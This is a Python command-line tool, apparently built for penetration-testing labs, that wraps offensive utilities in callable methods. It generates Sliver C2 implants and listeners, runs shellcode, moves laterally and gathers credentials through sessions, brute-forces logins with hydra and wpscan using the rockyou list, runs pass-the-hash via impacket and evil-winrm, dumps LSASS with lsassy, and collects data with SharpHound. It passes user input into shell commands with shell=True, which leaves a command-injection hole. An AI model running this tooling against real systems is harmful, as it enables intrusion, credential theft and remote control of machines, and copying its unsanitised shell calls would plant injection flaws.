#!/usr/bin/env python3

import logging
import os
import sqlite3
import subprocess
import json
import inspect
from concurrent.futures import Future, ThreadPoolExecutor
from threading import Thread
from typing import Optional, List, Dict

class Pentester:
    def __init__(self):
        self.logger = self.create_logger()
        self.db_path = 'pentester.db'
        self.connection: Optional[sqlite3.Connection] = None
        self.cursor: Optional[sqlite3.Cursor] = None
        self.RHOST = None
        self.RHOSTS = None
        self.LHOST = self.get_tun0_ip()
        self.LPORT = None
        self.RPORT = None
        self.RPROTOCOL = None
        self.USERNAME = None
        self._USERNAME = '/usr/share/wordlists/dirb/others/names.txt'
        self.PASSWORD = None
        self._PASSWORD = '/usr/share/wordlists/rockyou.txt'
        self.HASH = None
        self.HASHES = None
        self.DOMAIN = None
        self.FQDN = None
        self.SHARE = None
        self.HOME = '/home/kali'
        self.cwd = os.getcwd()
        
                # Sliver C2 specific attributes
        self.sliver_server = "127.0.0.1:31337"  # Default Sliver server address
        self.sliver_operator = "operator"  # Default operator name
        self.sliver_implant_name = "default_implant"  # Default implant name

    @staticmethod
    def create_logger():
        logger = logging.getLogger(__name__)
        logger.setLevel(logging.DEBUG)
        c_handler = logging.StreamHandler()
        f_handler = logging.FileHandler('/home/kali/pentest.log')
        c_handler.setLevel(logging.DEBUG)
        f_handler.setLevel(logging.DEBUG)
        log_format = logging.Formatter('%(levelname)s | %(asctime)s | %(name)s | %(message)s')
        c_handler.setFormatter(log_format)
        f_handler.setFormatter(log_format)
        logger.addHandler(c_handler)
        logger.addHandler(f_handler)
        return logger

    def log(self, msg):
        self.logger.debug(msg)

    def logg(self, msg):
        self.log('---------------------------')
        self.log(msg)
        self.log('---------------------------')

    @staticmethod
    def get_tun0_ip():
        try:
            result = subprocess.run(
                "ifconfig | grep tun0 -A 1 | grep inet | cut -b 14-27",
                shell=True, capture_output=True, text=True
            )
            return result.stdout.strip()
        except subprocess.CalledProcessError:
            return None

    def connect_db(self) -> bool:
        try:
            self.connection = sqlite3.connect(self.db_path)
            self.connection.row_factory = sqlite3.Row
            self.cursor = self.connection.cursor()
            self.log('Database connection successful')
            return True
        except sqlite3.Error as e:
            self.logger.exception(e)
            return False

    def close_db(self):
        if self.connection:
            self.connection.close()
            self.log('Database connection closed')
	
# Sliver C2 related methods
    def sliver_generate_implant(self, name: str, os_type: str, arch: str, format: str = "executable") -> str:
        """Generate a Sliver implant"""
        command = f"sliver-client generate --name {name} --os {os_type} --arch {arch} --format {format}"
        return self.execute_command(command)

    def sliver_start_listener(self, protocol: str, lhost: str, lport: int) -> str:
        """Start a Sliver listener"""
        command = f"sliver-client listener create --protocol {protocol} --lhost {lhost} --lport {lport}"
        return self.execute_command(command)

    def sliver_list_sessions(self) -> List[Dict]:
        """List active Sliver sessions"""
        command = "sliver-client sessions -o json"
        output = self.execute_command(command)
        if output:
            return json.loads(output)
        return []

    def sliver_interact_session(self, session_id: str, command: str) -> str:
        """Interact with a specific Sliver session"""
        full_command = f"sliver-client use -s {session_id} '{command}'"
        return self.execute_command(full_command)

    def sliver_execute_shellcode(self, session_id: str, shellcode_path: str) -> str:
        """Execute shellcode on a target via Sliver"""
        command = f"sliver-client use -s {session_id} 'execute-shellcode {shellcode_path}'"
        return self.execute_command(command)

    def sliver_upload_file(self, session_id: str, local_path: str, remote_path: str) -> str:
        """Upload a file to the target via Sliver"""
        command = f"sliver-client use -s {session_id} 'upload {local_path} {remote_path}'"
        return self.execute_command(command)

    def sliver_download_file(self, session_id: str, remote_path: str, local_path: str) -> str:
        """Download a file from the target via Sliver"""
        command = f"sliver-client use -s {session_id} 'download {remote_path} {local_path}'"
        return self.execute_command(command)

    def sliver_run_lateral_movement(self, session_id: str, target: str, method: str) -> str:
        """Perform lateral movement using Sliver"""
        command = f"sliver-client use -s {session_id} 'lateral-movement {method} {target}'"
        return self.execute_command(command)

    def sliver_gather_credentials(self, session_id: str) -> str:
        """Gather credentials from the target system using Sliver"""
        command = f"sliver-client use -s {session_id} 'credential-manager'"
        return self.execute_command(command)
        
    def execute_command(self, command):
        self.log(f"Executing: {command}")
        try:
            result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
            self.log(f"Command output: {result.stdout}")
            return result.stdout
        except subprocess.CalledProcessError as e:
            self.log(f"Command failed: {e}")
            return None
            
    def nmap_quick(self, target:str):
    	"""Quick & Dirty nmap scan"""
    	command = f'nmap -vv -T4 --min-rate=1000 -sT -Pn {target} -oA nmap_q_scan'
    	return self.execute_command(command)
    	
    def nmap_standard(self, target:str):
    	"""Standard -A nmap scan"""
    	command = f'nmap -vv -T4 --min-rate=1000 -A -Pn {target} -oA nmap_s_scan'
    	return self.execute_command(command)
    	
    def nmap_long(self, target:str):
    	"""Long -p- nmap scan"""
    	command = f'nmap -vv -T4 --min-rate=1000 -sT -p- -Pn {target} -oA nmap_l_scan'
    	return self.execute_command(command)
    	
    def nmap_udp(self,target:str):
    	"""UDP -sU nmap scan"""
    	command = f'nmap -vv -T3 --min-rate=1000 -sU -p- -Pn {target} -oA nmap_u_scan'
    	return self.execute_command(command)
    	
    def wpscan(self):
        command = f'wpscan --url http://{self.RHOST}/wp/wp-login.php --usernames admin --passwords {self._PASSWORD} --max-threads=50'
        return self.execute_command(command)
        
    def smb(self):
    	"""enum4linux
    	smbclient"""
		
    def enum4linux(self):
        command = f'enum4linux -a {self.RHOST}'
        return self.execute_command(command)

    def hydra_brute(self):
        command = f'hydra -L {self._USERNAME} -P {self._PASSWORD} -vV {self.RHOST} {self.RPROTOCOL}'
        return self.execute_command(command)

    def impacket_psexec(self):
        command = f'impacket-psexec {self.DOMAIN}/{self.USERNAME}:{self.PASSWORD}@{self.RHOST}'
        return self.execute_command(command)

    def impacket_wmiexec(self):
        command = f'impacket-wmiexec -hashes 00000000000000000000000000000000:{self.HASH} {self.USERNAME}@{self.RHOST}'
        return self.execute_command(command)

    def evil_winrm(self):
        command = f'evil-winrm -i {self.RHOST} -u {self.USERNAME} -H {self.HASH}'
        return self.execute_command(command)

    def lsassy(self):
    	"""lsassy"""
    	command = f'lsassy -d {self.DOMAIN} -u {self.USERNAME} -p {self.PASSWORD} {self.RHOST}'
    	f'''{command}'''
    	return self.execute_command(command)

    def sharphound(self):
        command = 'Import-Module ./SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\\TEMP\\" -OutputPrefix audit'
        return self.execute_command(command)

    def bloodhound(self):
        command = 'sudo neo4j start && bloodhound'
        return self.execute_command(command)
        
    def search_methods(self, query: str) -> List[str]:
        """Search for class methods based on a query string"""
        methods = inspect.getmembers(self, predicate=inspect.ismethod)
        return [name for name, _ in methods if query.lower() in name.lower()]
    
    def get_method_info(self, method_name: str) -> str:
        """Get detailed information about a specific method"""
        method = getattr(self, method_name, None)
        if method:
            signature = inspect.signature(method)
            doc = inspect.getdoc(method)
            
            # Extract short description (first line of docstring)
            short_desc = doc.split('\n')[0] if doc else "No description available."
            
            # Get parameter information
            params = []
            for name, param in signature.parameters.items():
                if name != 'self':
                    param_doc = ""
                    if doc:
                        param_lines = [line.strip() for line in doc.split('\n') if line.strip().startswith(f"{name}:")]
                        if param_lines:
                            param_doc = param_lines[0].split(':', 1)[1].strip()
                    
                    default = f" (default: {param.default})" if param.default != inspect.Parameter.empty else ""
                    params.append(f"  {name}: {param.annotation.__name__ if param.annotation != inspect.Parameter.empty else 'Any'}{default}")
                    if param_doc:
                        params.append(f"    Description: {param_doc}")

            params_str = "\n".join(params) if params else "  No parameters"

            return f"{method_name}{signature}\n\nDescription: {short_desc}\n\nParameters:\n{params_str}\n\nFull Docstring:\n{doc}"
        return f"Method '{method_name}' not found."

def run_cli():
    pentester = Pentester()
    pentester.connect_db()

    print("Welcome to the Pentester CLI!")
    print("Type 'search <query>' to search for methods.")
    print("Type 'info <method_name>' to get information about a specific method.")
    print("Type 'run <method_name> [args]' to execute a method.")
    print("Type 'exit' to quit.")

    while True:
        command = input("\nPentester> ").strip()
        
        if command.lower() == 'exit':
            break
        
        if command.lower().startswith('search '):
            query = command[7:]
            results = pentester.search_methods(query)
            if results:
                print("Matching methods:")
                for method in results:
                    print(f"- {method}")
            else:
                print("No matching methods found.")
        
        elif command.lower().startswith('info '):
            method_name = command[5:]
            print(pentester.get_method_info(method_name))
        
        elif command.lower().startswith('run '):
            parts = command[4:].split()
            method_name = parts[0]
            args = parts[1:]
            method = getattr(pentester, method_name, None)
            if method and callable(method):
                try:
                    result = method(*args)
                    print(f"Result: {result}")
                except Exception as e:
                    print(f"Error executing method: {e}")
            else:
                print(f"Method '{method_name}' not found or not callable.")
        
        else:
            print("Unknown command. Type 'search', 'info', 'run', or 'exit'.")

    pentester.close_db()
    print("Thank you for using Pentester CLI. Goodbye!")

    
def threadit(fn):
    def wrapper(*args, **kwargs):
        future = Future()
        Thread(target=call_with_future, args=(fn, future, args, kwargs), daemon=True).start()
        return future
    return wrapper

def threadmany(fn, thread_count):
    tp = ThreadPoolExecutor(thread_count)
    def wrapper(*args, **kwargs):
        return tp.submit(fn, *args, **kwargs)
    return wrapper

def call_with_future(fn, future, args, kwargs):
    try:
        result = fn(*args, **kwargs)
        future.set_result(result)
    except Exception as exc:
        future.set_exception(exc)

if __name__ == "__main__":
    run_cli()
    
'''
pentester = Pentester()
pentester.connect_db()
pentester.RHOST = "192.168.1.100"
pentester.USERNAME = "admin"
pentester.PASSWORD = "password123"
pentester.wpscan()
pentester.enum4linux()
pentester.close_db()
'''
